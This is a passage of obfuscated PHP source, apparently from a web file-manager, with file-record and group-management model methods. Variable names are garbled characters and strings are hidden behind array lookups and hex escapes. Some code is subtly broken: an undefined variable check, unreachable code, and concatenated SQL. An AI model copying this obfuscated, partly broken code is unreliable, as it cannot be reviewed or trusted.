$Ï²¾×ó‚[2192] . $“îûã®é[$Ï²¾×ó‚[87]]; $„Şİõ¿Ğ = $Ï²¾×ó‚[2193] . $“îûã®é[$Ï²¾×ó‚[564]]; TaskQueue::add($Ï²¾×ó‚[2194], $€ƒšİÙ€, $Êé±òŒ, $„Şİõ¿Ğ); } public function fileMd5Set($ÙŞÃãšâ, $³¼ãõÎ„) { $¸ãÆËë° =& $_SERVER[€ä¾™²]; $ŠÃÔ””” = $this->find($ÙŞÃãšâ); if (!$ŠÃÔ””” || $ŠÃÔ”””[$¸ãÆËë°[570]]) { return; } $Ô™äÍ» = IO::hashMd5($³¼ãõÎ„); if (!$Ô™äÍ») { return $¸ãÆËë°[12]; } $this->where(array($¸ãÆËë°[564] => $ÙŞÃãšâ))->save(array($¸ãÆËë°[570] => $Ô™äÍ»)); } public function addFileMake($Â›ÔàÔÒ, $°ö›€Ñ, $»…½¦‘ğ, $Èƒïíä·, $Ÿºîı˜ğ, $¢şö½²Û, $ä¿òØ±Á) { $ãÆîª¯ =& $_SERVER[€ä¾™²]; $üòÊş…Á = $this->createFileName($¢şö½²Û, $°ö›€Ñ, $Èƒïíä·, $Ÿºîı˜ğ); $Š‡ŒÄÍ¥ = get_path_father($üòÊş…Á); $ƒ«²ûâ = get_path_this($üòÊş…Á); if ($ä¿òØ±Á) { $ç‚ñú¿² = IO::move($Â›ÔàÔÒ, $Š‡ŒÄÍ¥, !1, $ƒ«²ûâ); } else { $ç‚ñú¿² = IO::copy($Â›ÔàÔÒ, $Š‡ŒÄÍ¥, !1, $ƒ«²ûâ); } if (!$ç‚ñú¿²) { return !1; } $¤ĞøÏ›Ú = IO::init($ç‚ñú¿²); $¤ĞøÏ›Ú->cacheMethod($ãÆîª¯[180], $¤ĞøÏ›Ú->path, $ãÆîª¯[177]); if (IO::size($ç‚ñú¿²) != $»…½¦‘ğ) { return !1; } $’“«ã° = array($ãÆîª¯[647] => $»…½¦‘ğ, $ãÆîª¯[2188] => 1, $ãÆîª¯[516] => $¢şö½²Û, $ãÆîª¯[915] => $°ö›€Ñ[$ãÆîª¯[486]], $ãÆîª¯[517] => $üòÊş…Á, $ãÆîª¯[2189] => $Èƒïíä·, $ãÆîª¯[2190] => $Ÿºîı˜ğ); return $’“«ã°; } public function addFileCheckExist($Ø‚Éíßõ, $æÍ­ì±Ä, $§Ï«Êë¨) { $·‹ùÕŞ¬ =& $_SERVER[€ä¾™²]; $×¥ê€¹ü = $this->findByHash($Ø‚Éíßõ, $æÍ­ì±Ä); if (!$×¥ê€¹ü) { return !1; } $±Ì¾ü÷ = array($·‹ùÕŞ¬[2188] => intval($×¥ê€¹ü[$·‹ùÕŞ¬[2195]]) + 1, $·‹ùÕŞ¬[647] => $§Ï«Êë¨); $this->where(array($·‹ùÕŞ¬[565] => $×¥ê€¹ü[$·‹ùÕŞ¬[564]]))->save($±Ì¾ü÷); return $×¥ê€¹ü; } public function remove($œíÇ¶å¡) { $this->linkCountChange($œíÇ¶å¡, !1); $this->clearEmpty(); return !0; } public function linkAdd($¾Œôº¤ó) { $this->linkCountChange($¾Œôº¤ó, !0); } public function linkCountChange($çõÇƒµ, $Áğ¡¬È) { $™éŸºŠÕ =& $_SERVER[€ä¾™²]; if (!$çõÇƒµ) { return; } if (!is_array($çõÇƒµ)) { $çõÇƒµ = array($çõÇƒµ); } $ÖºÙ¥ø¹ = array(); foreach ($çõÇƒµ as $Ä÷¶öü) { $×ıİœÄ = $Ä÷¶öü . $™éŸºŠÕ[12]; if (!$ÖºÙ¥ø¹[$×ıİœÄ]) { $ÖºÙ¥ø¹[$×ıİœÄ] = 0; } $ÖºÙ¥ø¹[$×ıİœÄ]++; } $Ôöïë£ƒ = array(); foreach ($ÖºÙ¥ø¹ as $Ä÷¶öü => $®è¾°¹®) { $×ıİœÄ = $®è¾°¹® . $™éŸºŠÕ[12]; if (!$Ôöïë£ƒ[$×ıİœÄ]) { $Ôöïë£ƒ[$×ıİœÄ] = array(); } $Ôöïë£ƒ[$×ıİœÄ][] = $Ä÷¶öü; } foreach ($Ôöïë£ƒ as $®è¾°¹® => $íÓ¾ˆº€) { if (!$íÓ¾ˆº€) { continue; } $®è¾°¹® = $Áğ¡¬È ? $®è¾°¹® : -intval($®è¾°¹®); $÷Ü×Ú = array($™éŸºŠÕ[564] => array($™éŸºŠÕ[7], $íÓ¾ˆº€)); if ($®è¾°¹® < 0) { $÷Ü×Ú[$™éŸºŠÕ[2195]] = array($™éŸºŠÕ[1128], abs($®è¾°¹®)); } $this->where($÷Ü×Ú)->setAdd($™éŸºŠÕ[2195], $®è¾°¹®); } } public function findByHash($¥Á¯íŒ», $£õ˜âõ¸ = false) { $®âŠŒäè =& $_SERVER[€ä¾™²]; if (!$¥Á¯íŒ» && !$£õ˜âõ¸) { return !1; } $…”Â‘äì = array($®âŠŒäè[2189] => $¥Á¯íŒ»); if ($£õ˜âõ¸) { $…”Â‘äì = array($®âŠŒäè[2190] => $£õ˜âõ¸); } return $this->order($®âŠŒäè[2196])->where($…”Â‘äì)->find(); } public function clearEmpty($»üñóØ = 1) { $±Ò×âáÜ =& $_SERVER[€ä¾™²]; $À­çÎáÙ = time() - 3600 * 24 * $»üñóØ; $Õº¿Óú = $±Ò×âáÜ[2197] . $À­çÎáÙ; $•İÂ¶İ = $this->where($Õº¿Óú)->select(); if (!$•İÂ¶İ) { return; } $ğ­Œ¿”© = new Task($±Ò×âáÜ[2198], $±Ò×âáÜ[12], count($•İÂ¶İ)); foreach ($•İÂ¶İ as $É­óÌ¼¹) { $ğ­Œ¿”©->update(1); $this->resetFile($É­óÌ¼¹); } $ğ­Œ¿”©->end(); } public function resetFile($ñÑËÑŞÜ) { $™È‚ŸÇ =& $_SERVER[€ä¾™²]; $€õÀğ¾´ = array($™È‚ŸÇ[565] => $ñÑËÑŞÜ[$™È‚ŸÇ[564]]); $˜Ò¤ÌšÙ = Model($™È‚ŸÇ[1479])->where($€õÀğ¾´)->count(); $Ò·ªûŒ´ = Model($™È‚ŸÇ[2199])->where($€õÀğ¾´)->count(); $ÄóòŞÀº = intval($˜Ò¤ÌšÙ) + intval($Ò·ªûŒ´); if ($ÄóòŞÀº == 0) { Model($™È‚ŸÇ[2200])->delete($ñÑËÑŞÜ[$™È‚ŸÇ[564]]); $this->where($€õÀğ¾´)->delete(); $this->metaSet($ñÑËÑŞÜ[$™È‚ŸÇ[564]], null, null); if (!IO::isFile($ñÑËÑŞÜ[$™È‚ŸÇ[87]])) { write_log(array($™È‚ŸÇ[2201], ACTION, $ñÑËÑŞÜ), $™È‚ŸÇ[1314]); return !1; } IO::remove($ñÑËÑŞÜ[$™È‚ŸÇ[87]]); write_log(ACTION . $™È‚ŸÇ[940] . KodUser::id() . $™È‚ŸÇ[2202] . $ñÑËÑŞÜ[$™È‚ŸÇ[564]] . $™È‚ŸÇ[1991] . $ñÑËÑŞÜ[$™È‚ŸÇ[79]] . $™È‚ŸÇ[200] . $ñÑËÑŞÜ[$™È‚ŸÇ[87]], $™È‚ŸÇ[2201]); return; } if ($ñÑËÑŞÜ[$™È‚ŸÇ[2195]] != $ÄóòŞÀº) { $this->where($€õÀğ¾´)->save(array($™È‚ŸÇ[2188] => $ÄóòŞÀº)); } } public function storageInfo($›©Ä³½— = false) { $ÆÒÄë“ =& $_SERVER[€ä¾™²]; $‘™Ê¤œí = $this->count() + 0.0; $ù’¯‹¯· = 0; $£ƒƒ˜± = 1; $÷÷»œÃİ = 0; $¿¤³ÂåÔ = 5000; for ($Şæ¦ëİ« = 0; $Şæ¦ëİ« < $‘™Ê¤œí; $Şæ¦ëİ« = $Şæ¦ëİ« + $¿¤³ÂåÔ) { $â¸½«Œ = $this->limit($Şæ¦ëİ«, $Şæ¦ëİ« + $¿¤³ÂåÔ)->select(); foreach ($â¸½«Œ as $“¯²óÇˆ) { $£ƒƒ˜± += $“¯²óÇˆ[$ÆÒÄë“[79]] * $“¯²óÇˆ[$ÆÒÄë“[2195]]; $ù’¯‹¯· += $“¯²óÇˆ[$ÆÒÄë“[79]] * ($“¯²óÇˆ[$ÆÒÄë“[2195]] - 1); $÷÷»œÃİ += $“¯²óÇˆ[$ÆÒÄë“[2195]]; } } $ºƒ†òîì = array($ÆÒÄë“[2203] => $£ƒƒ˜±, $ÆÒÄë“[2204] => $ù’¯‹¯·, $ÆÒÄë“[2205] => $ù’¯‹¯· / $£ƒƒ˜±, $ÆÒÄë“[83] => $‘™Ê¤œí, $ÆÒÄë“[2206] => $÷÷»œÃİ); return $ºƒ†òîì; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\x70"; protected $tableMeta = array("\x74\141\142\154\145\116\x61\x6d\x65" => "\147\162\157\165\160\137\155\x65\x74\141", "\x6d\145\164\x61\x46\151\x65\154\x64" => "\147\x72\157\x75\x70\x49\104"); protected function cacheFunctionAlias($‹Ş©‹íÖ) { $Ï×«¼üƒ =& $_SERVER[€ä¾™²]; return array($Ï×«¼üƒ[2207] => array($‹Ş©‹íÖ[0], $Ï×«¼üƒ[2208]), $Ï×«¼üƒ[2209] => array($‹Ş©‹íÖ[0], $Ï×«¼üƒ[2210])); } protected function ___getInfo($·µºúøˆ) { $ºáÀ¹üû = $this->getInfoSimple($·µºúøˆ); if (!$ºáÀ¹üû) { return !1; } return $this->_listDataApplyItem($ºáÀ¹üû); } protected function ___getInfoSimple($ééî„ê) { $şÈ¤ô»á = array($_SERVER[€ä¾™²][1441] => intval($ééî„ê)); $¥¿Ÿ¹ıâ = $this->where($şÈ¤ô»á)->find(); return is_array($¥¿Ÿ¹ıâ) ? $¥¿Ÿ¹ıâ : array(); } protected function groupAdd($Ø—«€¡) { $ü¥ÉéÄ£ =& $_SERVER[€ä¾™²]; if (!$Ø—«€¡[$ü¥ÉéÄ£[191]] && isset($Ø—«€¡[$ü¥ÉéÄ£[1441]]) && $Ø—«€¡[$ü¥ÉéÄ£[1441]] == 1) { if ($Èæ¦«ªÚ = $this->getInfoSimple($Ø—«€¡[$ü¥ÉéÄ£[1441]], !0)) { return $Ø—«€¡[$ü¥ÉéÄ£[1441]]; } } else { $Èæ¦«ªÚ = $this->getInfoSimple($Ø—«€¡[$ü¥ÉéÄ£[191]]); if (!$Èæ¦«ªÚ) { return !1; } } $øĞ¿ıô’ = $ü¥ÉéÄ£[620]; if ($Èæ¦«ªÚ[$ü¥ÉéÄ£[611]]) { $øĞ¿ıô’ = $Èæ¦«ªÚ[$ü¥ÉéÄ£[611]] . $Èæ¦«ªÚ[$ü¥ÉéÄ£[1441]] . $ü¥ÉéÄ£[50]; } $‡Àå¿¿Ï = array($ü¥ÉéÄ£[516] => $this->groupNameAuto($Ø—«€¡[$ü¥ÉéÄ£[191]], $Ø—«€¡[$ü¥ÉéÄ£[32]]), $ü¥ÉéÄ£[499] => $Ø—«€¡[$ü¥ÉéÄ£[191]], $ü¥ÉéÄ£[681] => $øĞ¿ıô’, $ü¥ÉéÄ£[2211] => $Ø—«€¡[$ü¥ÉéÄ£[2115]], $ü¥ÉéÄ£[2212] => 0, $ü¥ÉéÄ£[2132] => 0); $Ø—«€¡[$ü¥ÉéÄ£[32]] = $‡Àå¿¿Ï[$ü¥ÉéÄ£[32]]; if (isset($Ø—«€¡[$ü¥ÉéÄ£[2150]])) { $‡Àå¿¿Ï[$ü¥ÉéÄ£[2150]] = $Ø—«€¡[$ü¥ÉéÄ£[2150]]; } else { $°şÙØ = $this->max($ü¥ÉéÄ£[2150]); if (!$°şÙØ) { $°şÙØ = 0; } $‡Àå¿¿Ï[$ü¥ÉéÄ£[2150]] = $°şÙØ + 1; } if (!empty($Ø—«€¡[$ü¥ÉéÄ£[1441]])) { $‡Àå¿¿Ï[$ü¥ÉéÄ£[1441]] = $Ø—«€¡[$ü¥ÉéÄ£[1441]]; } $äü ğœø = $this->add($‡Àå¿¿Ï); $this->groupMetaEdit($äü ğœø, $Ø—«€¡); Model($ü¥ÉéÄ£[1479])->groupRootAdd($äü ğœø); $this->_clearCache($Ø—«€¡[$ü¥ÉéÄ£[191]]); return $äü ğœø; } protected function groupEdit($£óÃë¿ã, $Ó”ÏÊ‹¹) { $úéÒé =& $_SERVER[€ä¾™²]; $²ÂÇíß = $this->getInfoSimple($£óÃë¿ã); if (!$²ÂÇíß) { return !1; } if (!empty($Ó”ÏÊ‹¹[$úéÒé[191]])) { $ƒä€½™ï = $this->getInfoSimple($Ó”ÏÊ‹¹[$úéÒé[191]]); if (!$ƒä€½™ï) { return !1; } if ($²ÂÇíß[$úéÒé[1441]] == $ƒä€½™ï[$úéÒé[1441]]) { return !1; } if ($Ó”ÏÊ‹¹[$úéÒé[191]] != $²ÂÇíß[$úéÒé[191]]) { if ($ƒä€½™ï[$úéÒé[611]] !== $²ÂÇíß[$úéÒé[611]] && strpos($ƒä€½™ï[$úéÒé[611]], $²ÂÇíß[$úéÒé[611]] . $²ÂÇíß[$úéÒé[1441]] . $úéÒé[50]) === 0) { return !1; } $Ó”ÏÊ‹¹[$úéÒé[681]] = $ƒä€½™ï[$úéÒé[611]] . $Ó”ÏÊ‹¹[$úéÒé[191]] . $úéÒé[50]; $this->_changeChildLevel($²ÂÇíß, $ƒä€½™ï); $this->_clearCache($ƒä€½™ï[$úéÒé[1441]]); $this->_clearCache($²ÂÇíß[$úéÒé[191]]); } } $this->groupMetaEdit($£óÃë¿ã, $Ó”ÏÊ‹¹); $this->_clearChildrenCache($²ÂÇíß); return $this->where(array($úéÒé[2213] => $£óÃë¿ã))->save($Ó”ÏÊ‹¹); } private function groupMetaEdit($œëìºÖê, &$¤«¡Àé‚) { $¡ÃÚÛØù =& $_SERVER[€ä¾™²]; if (isset($¤«¡Àé‚[$¡ÃÚÛØù[32]])) { $this->setNamePinyin($œëìºÖê, $¤«¡Àé‚[$¡ÃÚÛØù[32]]); } if (isset($¤«¡Àé‚[$¡ÃÚÛØù[2214]])) { $ÇËÔ€Î· = array($¡ÃÚÛØù[2214] => $¤«¡Àé‚[$¡ÃÚÛØù[2214]], $¡ÃÚÛØù[2215] => $¤«¡Àé‚[$¡ÃÚÛØù[2215]]); unset($¤«¡Àé‚[$¡ÃÚÛØù[2214]]); unset($¤«¡Àé‚[$¡ÃÚÛØù[2215]]); if (isset($¤«¡Àé‚[$¡ÃÚÛØù[2216]])) { $á¬³âßØ = $¡ÃÚÛØù[1437] . $œëìºÖê; $•¬õÜßÇ = $¡ÃÚÛØù[1436]; $Èö„×¶¼ = $¤«¡Àé‚[$¡ÃÚÛØù[2216]] ? $¤«¡Àé‚[$¡ÃÚÛØù[2216]] : $¡ÃÚÛØù[12]; $ÊÊ¹€õ· = Model($¡ÃÚÛØù[1435])->get($á¬³âßØ, $•¬õÜßÇ); $ÊÊ¹€õ· = $ÊÊ¹€õ· ? $ÊÊ¹€õ· : $¡ÃÚÛØù[12]; if ($ÊÊ¹€õ· != $Èö„×¶¼) { if (!$Èö„×¶¼ && $ÊÊ¹€õ·) { Model($¡ÃÚÛØù[1435])->remove($á¬³âßØ, $•¬õÜßÇ); } else { if ($Èö„×¶¼) { Model($¡ÃÚÛØù[1435])->set($á¬³âßØ, $Èö„×¶¼, $•¬õÜßÇ); } } } $ÇËÔ€Î·[$¡ÃÚÛØù[2216]] = $Èö„×¶¼; } $this->metaSet($œëìºÖê, $ÇËÔ€Î·); } } private function _clearChildrenCache($óä×ÊÁ—) { $»¾úÁ =& $_SERVER[€ä¾™²]; $Äµà¿Ä = array($»¾úÁ[681] => array($»¾úÁ[642], $óä×ÊÁ—[$»¾úÁ[611]] . $óä×ÊÁ—[$»¾úÁ[1441]] . $»¾úÁ[643])); $‰”áã¿Ï = $this->field($»¾úÁ[1441])->where($Äµà¿Ä)->select(); foreach ($‰”áã¿Ï as $†’áäıó) { $this->_clearCache($†’áäıó[$»¾úÁ[1441]]); } } private function _clearCache($Ûİïá›†) { $ƒêáÔˆÆ =& $_SERVER[€ä¾™²]; $this->cacheFunctionClear($ƒêáÔˆÆ[2217], $Ûİïá›†); $this->cacheFunctionClear($ƒêáÔˆÆ[2218], $Ûİïá›†); } private function _changeChildLevel($Ê¶·³¼Ï, $¥ß¬Ò®¨, $®×ß×ñú = false) { $ø±ÅŒÜˆ =& $_SERVER[€ä¾™²]; $‰ô÷‘¿Ş = $Ê¶·³¼Ï[$ø±ÅŒÜˆ[611]] . $Ê¶·³¼Ï[$ø±ÅŒÜˆ[1441]] . $ø±ÅŒÜˆ[50]; $âÆàé„ = $¥ß¬Ò®¨[$ø±ÅŒÜˆ[611]] . $¥ß¬Ò®¨[$ø±ÅŒÜˆ[1441]] . $ø±ÅŒÜˆ[50] . $Ê¶·³¼Ï[$ø±ÅŒÜˆ[1441]] . $ø±ÅŒÜˆ[50]; if ($®×ß×ñú) { $âÆàé„ = $¥ß¬Ò®¨[$ø±ÅŒÜˆ[611]] . $¥ß¬Ò®¨[$ø±ÅŒÜˆ[1441]] . $ø±ÅŒÜˆ[50]; } $§‹ÆşÏÀ = array($ø±ÅŒÜˆ[681] => array($ø±ÅŒÜˆ[642], $Ê¶·³¼Ï[$ø±ÅŒÜˆ[611]] . $Ê¶·³¼Ï[$ø±ÅŒÜˆ[1441]] . $ø±ÅŒÜˆ[643])); $§¥ıÀ¹Î = array($ø±ÅŒÜˆ[681] => array($ø±ÅŒÜˆ[690], "\x72\145\160\154\x61\x63\x65\x28\x70\141\162\145\x6e\x74\114\145\x76\145\x6c\54\47{$‰ô÷‘¿Ş}\47\x2c\x27{$âÆàé„}\47\x29")); $this->_clearChildrenCache($Ê¶·³¼Ï); $this->where($§‹ÆşÏÀ)->data($§¥ıÀ¹Î)->save(); } public function setNamePinyin($ˆëĞ’¢—, $ó›øû†ô = false) { $ÚÏĞñ©Š =& $_SERVER[€ä¾™²]; if (!$ó›øû†ô) { $ËöëÛ¢ª = $this->getInfoSimple($ˆëĞ’¢—); $ó›øû†ô = $ËöëÛ¢ª[$ÚÏĞñ©Š[32]]; } if (!Input::check($ó›øû†ô, $ÚÏĞñ©Š[684])) { $this->metaSet($ˆëĞ’¢—, $ÚÏĞñ©Š[559], null); $this->metaSet($ˆëĞ’¢—, $ÚÏĞñ©Š[558], null); return; } $şî“ğêÎ = array($ÚÏĞñ©Š[559] => str_replace($ÚÏĞñ©Š[53], $ÚÏĞñ©Š[12], Pinyin::get($ó›øû†ô)), $ÚÏĞñ©Š[558] => Pinyin::get($ó›øû†ô, $ÚÏĞñ©Š[685])); $this->metaSet($ˆëĞ’¢—, $şî“ğêÎ); } protected function metaSet($ĞÛî¦ë, $õ”Õèú“ = null, $Æ¾Û£º = null) { $this->_clearCache($ĞÛî¦ë); return parent::metaSet($ĞÛî¦ë, $õ”Õèú“, $Æ¾Û£º); } protected function groupStatus($§¿‹”‹—, $Õ©ŞÈ“) { $è°ÆÖºç =& $_SERVER[€ä¾™²]; $×èÚ¹şä = $this->getInfoSimple($§¿‹”‹—); if (!$×èÚ¹şä) { return !1; } $this->_clearCache($§¿‹”‹—); return $this->metaSet($§¿‹”‹—, $è°ÆÖºç[850], $Õ©ŞÈ“); if ($Õ©ŞÈ“ == $è°ÆÖºç[91]) { $¾Íøš«Š = $this->parentLevelArray($×èÚ¹şä[$è°ÆÖºç[611]]); } else { } $¾Íøš«Š[] = $×èÚ¹şä[$è°ÆÖºç[1441]]; $û¤Ô²ûì = array(); foreach ($¾Íøš«Š as $§¿‹”‹—) { $û¤Ô²ûì[] = array($è°ÆÖºç[1441] => $§¿‹”‹—, $è°ÆÖºç[95] => $è°ÆÖºç[850], $è°ÆÖºç[451] => $Õ©ŞÈ“); $this->_clearCache($§¿‹”‹—); } return Model($è°ÆÖºç[2219])->addAll($û¤Ô²ûì, array(), !0); } protected function groupRemove($û×ú–†ƒ, $Óöí‰Ùø = false) { $´ÍËÏó– =& $_SERVER[€ä¾™²]; $ª³¡µ“ñ = array($´ÍËÏó–[1441] => $û×ú–†ƒ); $úıÙ°®° = $this->where($ª³¡µ“ñ)->find(); if (!$úıÙ°®° || $úıÙ°®°[$´ÍËÏó–[191]] == 0) { return !1; } if (!$Óöí‰Ùø) { $•Áµ¢Ä = $this->getInfoSimple($úıÙ°®°[$´ÍËÏó–[191]]); $this->_changeChildLevel($úıÙ°®°, $•Áµ¢Ä, !0); $this->where(array($´ÍËÏó–[191] => $û×ú–†ƒ))->save(array($´ÍËÏó–[191] => $úıÙ°®°[$´ÍËÏó–[191]])); $this->_clearCache($•Áµ¢Ä[$´ÍËÏó–[1441]]); } Model($´ÍËÏó–[2219])->where($ª³¡µ“ñ)->delete(); Model($´ÍËÏó–[2220])->where($ª³¡µ“ñ)->delete(); Model($´ÍËÏó–[932])->groupRootRemove($û×ú–†ƒ); $this->_clearCache($úıÙ°®°[$´ÍËÏó–[191]]); return $this->where($ª³¡µ“ñ)->delete(); } protected function groupSort($òÍè–) { $ÕÃïûºú =& $_SERVER[€ä¾™²]; $¢ï±Âõœ = array(); foreach ($òÍè– as $¨ÙüŸß¿ => $ƒœÑ¼) { $¢ï±Âõœ[] = array($ÕÃïûºú[1441], $ƒœÑ¼, $ÕÃïûºú[2150], $¨ÙüŸß¿ + 1); } $this->saveAll($¢ï±Âõœ); } public function listData() { $šÊÂ·¿ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($šÊÂ·¿[$_SERVER[€ä¾™²][446]]); return $šÊÂ·¿; } private function _makeOrder($¿ËÇ¥Ä = '') { $ˆ‘™¦®Õ =& $_SERVER[€ä¾™²]; $ÍİËº¨Æ = array($ˆ‘™¦®Õ[1441], $ˆ‘™¦®Õ[32], $ˆ‘™¦®Õ[2117], $ˆ‘™¦®Õ[232]); $ï¥Õï€­ = array($ˆ‘™¦®Õ[544] => $ˆ‘™¦®Õ[545], $ˆ‘™¦®Õ[546] => $ˆ‘™¦®Õ[547]); $ÏªßÌ§Ô = Input::get($ˆ‘™¦®Õ[551], $ˆ‘™¦®Õ[7], $ˆ‘™¦®Õ[2132], $ÍİËº¨Æ); $°úÓ¤Ğœ = Input::get($ˆ‘™¦®Õ[552], $ˆ‘™¦®Õ[7], $ˆ‘™¦®Õ[2221], array($ˆ‘™¦®Õ[2221], $ˆ‘™¦®Õ[546])); $°úÓ¤Ğœ = $ï¥Õï€­[$°úÓ¤Ğœ]; $¿ËÇ¥Ä = $¿ËÇ¥Ä . "{$ÏªßÌ§Ô}\40{$°úÓ¤Ğœ}\54\x20\x67\162\x6f\x75\x70\111\104\x20\x61\163\143"; return $this->order($¿ËÇ¥Ä); } public function listChild($Ñ¯Ğéõ–) { $æ”Ï–ˆí =& $_SERVER[€ä¾™²]; $øšÍŸÕø = $this->where(array($æ”Ï–ˆí[191] => $Ñ¯Ğéõ–))->_makeOrder()->selectPage(200); $this->_listDataApply($øšÍŸÕø[$æ”Ï–ˆí[446]]); return $øšÍŸÕø; } public function listChildIds($ûü­•µÇ) { $ùı…´İ³ =& $_SERVER[€ä¾™²]; if (is_string($º½ñß¿)) { $ûü­•µÇ = explode($ùı…´İ³[50], $ûü­•µÇ); } $òëÀ‹ŸØ = $this->where(array($ùı…´İ³[1441] => array($ùı…´İ³[7], $ûü­•µÇ)))->field($ùı…´İ³[2222])->select(); if (!$òëÀ‹ŸØ) { return !1; } $ÔÛƒï³÷ = array(); foreach ($òëÀ‹ŸØ as $èæöàçÔ) { $ÔÛƒï³÷[] = "\x73\x65\154\x65\x63\x74\40\147\162\x6f\x75\x70\x49\104\x20\x66\x72\x6f\x6d\x20\x60\x67\x72\157\165\x70\x60\x20\x77\150\x65\x72\145\40\x70\141\x72\145\156\x74\x4c\x65\166\145\x6c\40\x6c\151\153\x65\x20\x27{$èæöàçÔ[$ùı…´İ³[611]]}{$èæöàçÔ[$ùı…´İ³[1441]]}\x2c\45\47"; } $ÔÛƒï³÷ = implode($ùı…´İ³[2223], $ÔÛƒï³÷); $òëÀ‹ŸØ = $this->query($ÔÛƒï³÷); if (!$òëÀ‹ŸØ) { return array(); } $ûü­•µÇ = array_to_keyvalue($òëÀ‹ŸØ, $ùı…´İ³[12], $ùı…´İ³[1441]); return array_unique($ûü­•µÇ); } public function listByID($‚Ôßîïü) { $¿®ŞË¹ =& $_SERVER[€ä¾™²]; if (!$‚Ôßîïü) { return array(); } $‰•ë¡¿¥ = array($¿®ŞË¹[1441] => array($¿®ŞË¹[7], $‚Ôßîïü)); $°Áö‘–‚ = $this->where($‰•ë¡¿¥)->select(); $°Áö‘–‚ = array_sort_keep($°Áö‘–‚, $¿®ŞË¹[1441], $‚Ôßîïü); $this->_listDataApply($°Áö‘–‚); return $°Áö‘–‚; } public function listSearch($³æÖ¿¼õ) { $˜›â€£î =& $_SERVER[€ä¾™²]; $ä–øîÑ˜ = trim($³æÖ¿¼õ[$˜›â€£î[2224]]); $î…Æ…Õü = explode($˜›â€£î[53], $ä–øîÑ˜); if (!$ä–øîÑ˜ || count($î…Æ…Õü) == 1) { return $this->listSearchNow($³æÖ¿¼õ); } $•Éüë¯û = array($˜›â€£î[446] => array()); foreach ($î…Æ…Õü as $›ı®¸Ä¶) { if (!trim($›ı®¸Ä¶)) { continue; } $³æÖ¿¼õ[$˜›â€£î[2224]] = $›ı®¸Ä¶; $‚÷’Ëë± = $this->listSearchNow($³æÖ¿¼õ); $•Éüë¯û[$˜›â€£î[446]] = array_merge($•Éüë¯û[$˜›â€£î[446]], $‚÷’Ëë±[$˜›â€£î[446]]); } $•Éüë¯û[$˜›â€£î[446]] = array_unique_by_key($•Éüë¯û[$˜›â€£î[446]], $˜›â€£î[1441]); $•Éüë¯û[$˜›â€£î[443]] = array($˜›â€£î[444] => count($•Éüë¯û[$˜›â€£î[446]]), $˜›â€£î[440] => 20, $˜›â€£î[429] => 1, $˜›â€£î[445] => 1); return $•Éüë¯û; } public function listSearchNow($ƒÜ²îŸì) { $­ûÒ·™Ù =& $_SERVER[€ä¾™²]; $ÂÜ˜©²º = trim($ƒÜ²îŸì[$­ûÒ·™Ù[2224]]); $´ò›Úı = isset($ƒÜ²îŸì[$­ûÒ·™Ù[2225]]) ? $ƒÜ²îŸì[$­ûÒ·™Ù[2225]] : !1; if (!trim($ÂÜ˜©²º)) { return !1; } $ÂÜ˜©²º = str_replace($­ûÒ·™Ù[2226], $­ûÒ·™Ù[2227], $ÂÜ˜©²º); $²œˆÃ = array($­ûÒ·™Ù[1441] => array($­ûÒ·™Ù[473], "{$ÂÜ˜©²º}\x25"), $­ûÒ·™Ù[32] => array($­ûÒ·™Ù[473], "\45{$ÂÜ˜©²º}\x25"), $­ûÒ·™Ù[1113] => $­ûÒ·™Ù[2228]); if ($´ò›Úı) { $†üã…ÂÓ = $this->getInfoSimple($´ò›Úı); $‡“µ¯Éİ = $†üã…ÂÓ[$­ûÒ·™Ù[611]] . $´ò›Úı . $­ûÒ·™Ù[643]; $²œˆÃ = array($²œˆÃ, array($­ûÒ·™Ù[611] => array($­ûÒ·™Ù[473], $‡“µ¯Éİ))); } $²œˆÃ = $this->parseWhereLike($²œˆÃ); $×­“Ş¥ê = $this->_makeOrder()->where($²œˆÃ)->selectPage(20); $×­“Ş¥ê = $×­“Ş¥ê ? $×­“Ş¥ê : array($­ûÒ·™Ù[446] => array(), $­ûÒ·™Ù[443] => array()); if (!$×­“Ş¥ê || count($×­“Ş¥ê[$­ûÒ·™Ù[446]]) < 5 && Input::check($ÂÜ˜©²º, $­ûÒ·™Ù[394])) { $÷¿÷¯¾© = $this->groupChildrenAll($´ò›Úı); $ø¶ÅØğÈ = $this->_searchFromMeta($­ûÒ·™Ù[558], $ÂÜ˜©²º, 10, $÷¿÷¯¾©); $ùåËùµ = $this->_searchFromMeta($­ûÒ·™Ù[559], $ÂÜ˜©²º, 10, $÷¿÷¯¾©); $¯Çµ…øå = array_merge($ø¶ÅØğÈ, $ùåËùµ, $×­“Ş¥ê[$­ûÒ·™Ù[446]]); $×­“Ş¥ê[$­ûÒ·™Ù[446]] = array_unique_by_key($¯Çµ…øå, $­ûÒ·™Ù[1441]); $×­“Ş¥ê[$­ûÒ·™Ù[443]][$­ûÒ·™Ù[444]] = count($×­“Ş¥ê[$­ûÒ·™Ù[446]]); $×­“Ş¥ê[$­ûÒ·™Ù[443]][$­ûÒ·™Ù[445]] = ceil($×­“Ş¥ê[$­ûÒ·™Ù[443]][$­ûÒ·™Ù[444]] / $×­“Ş¥ê[$­ûÒ·™Ù[443]][$­ûÒ·™Ù[440]]); } $this->_listDataApply($×­“Ş¥ê[$­ûÒ·™Ù[446]]); return $×­“Ş¥ê; } protected function groupChildrenAll($±‹‰ƒ¾) { $ÅúõØ´Ï =& $_SERVER[€ä¾™²]; if (!$±‹‰ƒ¾) { return !1; } if (!is_array($±‹‰ƒ¾)) { $±‹‰ƒ¾ = array($±‹‰ƒ¾); } $øÃšñ‰ = $±‹‰ƒ¾; foreach ($±‹‰ƒ¾ as $ŞÉîÈÄõ) { $€…»ËöŸ = $this->getInfoSimple($ŞÉîÈÄõ); $Èé¨àâ = array($ÅúõØ´Ï[611] => array($ÅúõØ´Ï[473], $€…»ËöŸ[$ÅúõØ´Ï[611]] . $ŞÉîÈÄõ . $ÅúõØ´Ï[643])); $§ğÓ×áâ = $this->field($ÅúõØ´Ï[1441])->where($Èé¨àâ)->select(); $øÃšñ‰ = array_merge($øÃšñ‰, array_to_keyvalue($§ğÓ×áâ, $ÅúõØ´Ï[12], $ÅúõØ´Ï[1441])); } return array_unique($øÃšñ‰); } private function _searchFromMeta($¤…â£€¹, $Ôü×œü, $¶üàì«Ù, $¾©ä´¬) { $”ñ¦ŒÏñ =& $_SERVER[€ä¾™²]; $Ôü×œü = strtolower($Ôü×œü); $¡ı¦Óà† = array($”ñ¦ŒÏñ[95] => $¤…â£€¹, $”ñ¦ŒÏñ[451] => 